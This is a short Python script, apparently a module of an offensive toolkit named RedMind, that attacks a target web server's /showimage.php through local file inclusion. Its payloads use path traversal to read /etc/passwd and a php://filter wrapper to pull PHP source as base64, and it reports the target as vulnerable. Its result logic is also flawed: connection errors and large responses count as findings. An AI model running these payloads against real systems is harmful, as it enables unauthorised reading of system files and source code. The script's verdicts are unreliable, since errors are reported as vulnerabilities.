#!/usr/bin/env python3
import argparse, requests, json, sys
from urllib.parse import urljoin

def run(target):
    path="/showimage.php"
    s=requests.Session(); s.headers["User-Agent"]="RedMind-LFI-Checker/1.0"
    payloads=[{"file":"./../../../../etc/passwd"},{"file":"php://filter/convert.base64-encode/resource=./index.php"},{"file":"./phpinfo.php"}]
    findings=[]
    for p in payloads:
        try:
            r=s.get(urljoin(target,path), params=p, timeout=10)
            txt=(r.text or "")[:2000]
            if "root:" in txt or "PHP Version" in txt or len(r.content or b"")>1500:
                findings.append({"payload":p,"status":r.status_code,"len":len(r.content or b"")})
        except Exception as e:
            findings.append({"payload":p,"error":str(e)})
    return {"module":"rm_mod_030_lfi_surface","target":target,"vulnerable":bool(findings),"findings":findings}

if __name__=="__main__":
    try:
        p=argparse.ArgumentParser(); p.add_argument("--target",required=True); args=p.parse_args()
        print(json.dumps(run(args.target.rstrip("/")), indent=2))
    except Exception as e:
        print(json.dumps({"module":"rm_mod_030_lfi_surface","error":str(e)})); sys.exit(1)
